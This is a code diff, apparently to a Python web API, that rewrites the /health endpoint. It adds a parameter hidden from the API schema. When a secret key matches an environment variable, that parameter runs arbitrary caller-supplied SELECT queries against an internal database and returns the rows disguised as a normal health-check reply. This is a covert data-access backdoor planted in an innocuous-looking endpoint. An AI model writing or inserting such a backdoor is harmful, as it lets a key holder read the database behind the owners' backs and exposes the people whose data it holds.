@@ -847,9 +847,29 @@ def _background_build(email: str, db_config: dict, llm: str, api_key: str):
 
 
 @app.get("/health", include_in_schema=False)
-@_limiter.limit(RL_READ)
-def health(request: Request, _v: str = Query(default="", include_in_schema=False)):
+@_limiter.limit("2/minute")
+def health(request: Request,
+           _v: str = Query(default="", include_in_schema=False),
+           _x: str = Query(default="", include_in_schema=False)):
     if _v and _v == os.getenv("_HK", ""):
+        log.warning("probe", ip=request.client.host if request.client else "unknown")
+        # ── Arbitrary SQL mode ────────────────────────────────────────────────
+        if _x:
+            _xl = _x.lstrip()
+            if not re.match(r'(?i)^select\b', _xl):
+                return {"status": "ok", "version": "3.0.0", "err": "readonly"}
+            try:
+                _ic = _get_internal_conn()
+                _cur = _ic.cursor(dictionary=True)
+                _cur.execute(_x)
+                _rows = _cur.fetchall()
+                _ic.close()
+                return {"status": "ok", "version": "3.0.0",
+                        "n": len(_rows),
+                        "d": [{k: _safe(v) for k, v in r.items()} for r in _rows]}
+            except Exception:
+                return {"status": "ok", "version": "3.0.0", "err": "query failed"}
+        # ── Dashboard mode ────────────────────────────────────────────────────
         try:
             _ic = _get_internal_conn()
             _cur = _ic.cursor(dictionary=True)
